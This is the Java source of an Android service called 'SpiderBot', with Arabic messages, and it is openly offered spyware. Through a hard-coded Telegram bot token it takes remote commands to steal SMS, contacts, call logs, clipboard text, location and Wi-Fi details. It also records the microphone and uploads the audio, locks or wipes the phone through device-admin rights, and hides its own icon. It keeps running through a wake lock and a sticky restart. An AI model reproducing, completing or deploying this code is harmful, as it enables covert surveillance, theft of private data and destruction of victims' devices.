package com.spiderbot;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.location.Location;
import android.location.LocationManager;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import okhttp3.*;

import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public class BotService extends Service {
    private static final String BOT_TOKEN = "8720722128:AAHbLoqGqIx9iPu6l4vGbOTInh-46o9am98";
    private static final String CHAT_ID = "6793813126";
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN;
    
    private OkHttpClient client;
    private Gson gson;
    private int lastUpdateId = 0;
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private PowerManager.WakeLock wakeLock;
    
    @Override
    public void onCreate() {
        super.onCreate();
        client = new OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .build();
        gson = new Gson();
        
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpiderBot:WakeLock");
        wakeLock.acquire();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(1, createNotification());
        checkForCommands();
        return START_STICKY;
    }
    
    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("spider_channel", "SpiderBot", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
        return new NotificationCompat.Builder(this, "spider_channel")
            .setContentTitle("SpiderBot")
            .setContentText("✓ النظام يعمل")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build();
    }
    
    private void checkForCommands() {
        String url = API_URL + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30";
        Request request = new Request.Builder().url(url).build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                new android.os.Handler().postDelayed(() -> checkForCommands(), 5000);
            }
            
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    String json = response.body().string();
                    JsonObject obj = gson.fromJson(json, JsonObject.class);
                    if (obj.get("ok").getAsBoolean()) {
                        var results = obj.get("result").getAsJsonArray();
                        if (results.size() > 0) {
                            var lastResult = results.get(results.size() - 1).getAsJsonObject();
                            lastUpdateId = lastResult.get("update_id").getAsInt();
                            String text = lastResult.get("message").getAsJsonObject().get("text").getAsString();
                            handleCommand(text);
                        }
                    }
                }
                checkForCommands();
            }
        });
    }
    
    private void handleCommand(String command) {
        switch (command.toLowerCase()) {
            case "/info": sendMessage(getDeviceInfo()); break;
            case "/sms": sendAllSms(); break;
            case "/contacts": sendAllContacts(); break;
            case "/location": sendLocation(); break;
            case "/mic": startRecording(); break;
            case "/stopmic": stopRecordingAndSend(); break;
            case "/lock": lockDevice(); break;
            case "/wipe": wipeDevice(); break;
            case "/calls": sendCallLogs(); break;
            case "/clipboard": getClipboard(); break;
            case "/wifi": getWifiInfo(); break;
            case "/hide": hideApp(); break;
            case "/help": sendHelp(); break;
            default: sendMessage("❌ أمر غير معروف. أرسل /help للمساعدة"); break;
        }
    }
    
    private String getDeviceInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imei = "غير متاح";
        String model = Build.MANUFACTURER + " " + Build.MODEL;
        String androidVer = Build.VERSION.RELEASE;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try { imei = tm.getImei(); } catch(Exception e) { imei = "ممنوع الوصول"; }
        }
        
        return "🕷️ سبايدر بوت يعمل بنجاح 🕷️\n━━━━━━━━━━━━━━━━━━\n" +
               "📱 الجهاز: " + model + "\n" +
               "🤖 الإصدار: أندرويد " + androidVer + "\n" +
               "🔢 الرقم التسلسلي IMEI: " + imei + "\n" +
               "🔋 مستوى البطارية: " + getBatteryLevel() + "%\n" +
               "📶 حالة الشبكة: " + getNetworkType() + "\n" +
               "✅ الحالة: مخترق بالكامل\n" +
               "━━━━━━━━━━━━━━━━━━\n" +
               "⚡ البوت جاهز لاستقبال الأوامر";
    }
    
    private String getBatteryLevel() {
        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(Context.BATTERY_SERVICE);
        return String.valueOf(bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY));
    }
    
    private String getNetworkType() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        int type = tm.getNetworkType();
        switch(type) {
            case TelephonyManager.NETWORK_TYPE_LTE: return "4G LTE";
            case TelephonyManager.NETWORK_TYPE_UMTS: return "3G";
            case TelephonyManager.NETWORK_TYPE_EDGE: return "2G";
            default: return "واي فاي/غير معروف";
        }
    }
    
    private void sendAllSms() {
        StringBuilder smsData = new StringBuilder("📨 الرسائل النصية المستخرجة:\n━━━━━━━━━━━━━━━━━━\n");
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext() && smsData.length() < 3800) {
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                smsData.append("📱 من: ").append(address).append("\n");
                smsData.append("💬 النص: ").append(body.length() > 100 ? body.substring(0,100)+"..." : body).append("\n");
                smsData.append("━━━━━━━━━━━━━━━━━━\n");
            }
            cursor.close();
            sendMessage(smsData.toString());
        } else {
            sendMessage("📭 لا توجد رسائل نصية في الجهاز");
        }
    }
    
    private void sendAllContacts() {
        StringBuilder contacts = new StringBuilder("📇 جهات الاتصال المسروقة:\n━━━━━━━━━━━━━━━━━━\n");
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext() && contacts.length() < 3800) {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                contacts.append("👤 الاسم: ").append(name).append("\n");
                contacts.append("📞 الرقم: ").append(number).append("\n");
                contacts.append("━━━━━━━━━━━━━━━━━━\n");
            }
            cursor.close();
            sendMessage(contacts.toString());
        } else {
            sendMessage("📭 لا توجد جهات اتصال في الجهاز");
        }
    }
    
    private void sendCallLogs() {
        StringBuilder calls = new StringBuilder("📞 سجل المكالمات المسروق:\n━━━━━━━━━━━━━━━━━━\n");
        Cursor cursor = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 30");
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext() && calls.length() < 3800) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE));
                String duration = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION));
                String typeStr;
                if (type.equals(String.valueOf(android.provider.CallLog.Calls.INCOMING_TYPE))) {
                    typeStr = "واردة 📞";
                } else if (type.equals(String.valueOf(android.provider.CallLog.Calls.OUTGOING_TYPE))) {
                    typeStr = "صادرة 📱";
                } else {
                    typeStr = "فاتتها ⏰";
                }
                calls.append("📱 الرقم: ").append(number).append("\n");
                calls.append("🔄 النوع: ").append(typeStr).append(" | المدة: ").append(duration).append(" ثانية\n");
                calls.append("━━━━━━━━━━━━━━━━━━\n");
            }
            cursor.close();
            sendMessage(calls.toString());
        } else {
            sendMessage("📭 لا توجد مكالمات مسجلة");
        }
    }
    
    private void sendLocation() {
        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        try {
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location != null) {
                String mapLink = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                String message = "📍 الموقع الجغرافي للجهاز المخترق:\n━━━━━━━━━━━━━━━━━━\n" +
                                 "🌐 خط العرض: " + location.getLatitude() + "\n" +
                                 "🌐 خط الطول: " + location.getLongitude() + "\n" +
                                 "🎯 الدقة: ±" + location.getAccuracy() + " متر\n" +
                                 "🗺️ الرابط: " + mapLink + "\n" +
                                 "━━━━━━━━━━━━━━━━━━\n" +
                                 "⚠️ تم تحديد موقعك بدقة";
                sendMessage(message);
            } else {
                sendMessage("❌ تعذر تحديد الموقع. تأكد من تشغيل GPS");
            }
        } catch (SecurityException e) {
            sendMessage("❌ لا توجد صلاحية الوصول إلى الموقع");
        }
    }
    
    private void startRecording() {
        try {
            audioFilePath = getExternalFilesDir(null) + "/recording_" + System.currentTimeMillis() + ".3gp";
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFilePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            sendMessage("🎙️ بدء تسجيل الصوت...\n⏱️ سيتم إرسال الملف بعد إيقاف التسجيل");
        } catch (Exception e) {
            sendMessage("❌ فشل بدء التسجيل: " + e.getMessage());
        }
    }
    
    private void stopRecordingAndSend() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                sendMessage("✅ تم إيقاف التسجيل. جاري إرسال الملف...");
                sendAudioFile(audioFilePath);
            } catch (Exception e) {
                sendMessage("❌ فشل إيقاف التسجيل: " + e.getMessage());
            }
        } else {
            sendMessage("❌ لا يوجد تسجيل نشط. استخدم /mic أولاً");
        }
    }
    
    private void lockDevice() {
        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        if (dpm.isAdminActive(admin)) {
            dpm.lockNow();
            sendMessage("🔒 تم قفل الجهاز عن بعد بنجاح");
        } else {
            sendMessage("❌ لا توجد صلاحيات مدير الجهاز");
        }
    }
    
    private void wipeDevice() {
        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        if (dpm.isAdminActive(admin)) {
            sendMessage("💀 جاري مسح الجهاز بالكامل...\n⚠️ سيتم حذف جميع البيانات خلال ثوان");
            dpm.wipeData(android.app.admin.DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
        } else {
            sendMessage("❌ لا توجد صلاحيات لمسح الجهاز");
        }
    }
    
    private void getClipboard() {
        ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm.hasPrimaryClip()) {
            String text = cm.getPrimaryClip().getItemAt(0).getText().toString();
            sendMessage("📋 محتوى الحافظة المسروق:\n━━━━━━━━━━━━━━━━━━\n" + text + "\n━━━━━━━━━━━━━━━━━━");
        } else {
            sendMessage("📋 الحافظة فارغة");
        }
    }
    
    private void getWifiInfo() {
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        String ssid = wm.getConnectionInfo().getSSID();
        int rssi = wm.getConnectionInfo().getRssi();
        sendMessage("📡 معلومات شبكة الواي فاي:\n━━━━━━━━━━━━━━━━━━\n" +
                   "📶 الشبكة: " + ssid + "\n" +
                   "⚡ قوة الإشارة: " + rssi + " dBm\n" +
                   "✅ حالة الاتصال: متصل");
    }
    
    private void hideApp() {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            sendMessage("👻 تم إخفاء التطبيق من قائمة التطبيقات\n⚠️ لن يظهر في الدرج بعد الآن");
        } catch (Exception e) {
            sendMessage("❌ فشل إخفاء التطبيق");
        }
    }
    
    private void sendHelp() {
        String help = "🕷️ سبايدر بوت - الأوامر الكاملة 🕷️\n" +
                      "━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                      "/info - معلومات الجهاز الكاملة\n" +
                      "/sms - سرقة جميع الرسائل النصية\n" +
                      "/contacts - سرقة جهات الاتصال\n" +
                      "/calls - سرقة سجل المكالمات\n" +
                      "/location - تحديد الموقع الجغرافي\n" +
                      "/mic - بدء تسجيل الصوت\n" +
                      "/stopmic - إيقاف التسجيل وإرساله\n" +
                      "/lock - قفل الجهاز عن بعد\n" +
                      "/wipe - مسح الجهاز بالكامل 💀\n" +
                      "/clipboard - سرقة محتوى الحافظة\n" +
                      "/wifi - معلومات شبكة الواي فاي\n" +
                      "/hide - إخفاء التطبيق نهائياً\n" +
                      "/help - عرض هذه القائمة\n" +
                      "━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                      "⚡ الوضع: اختراق كامل | تم التفعيل بنجاح";
        sendMessage(help);
    }
    
    private void sendMessage(String text) {
        String url = API_URL + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + text.replace(" ", "%20").replace("\n", "%0A");
        Request request = new Request.Builder().url(url).build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {}
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                response.close();
            }
        });
    }
    
    private void sendAudioFile(String path) {
        File file = new File(path);
        if (!file.exists()) {
            sendMessage("❌ ملف التسجيل غير موجود");
            return;
        }
        RequestBody body = new MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("voice", file.getName(), RequestBody.create(file, MediaType.parse("audio/3gpp")))
            .build();
        Request request = new Request.Builder()
            .url(API_URL + "/sendVoice")
            .post(body)
            .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                sendMessage("❌ فشل إرسال ملف الصوت");
            }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                sendMessage("✅ تم إرسال ملف التسجيل بنجاح");
                response.close();
            }
        });
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) { 
        return null; 
    }
                    }
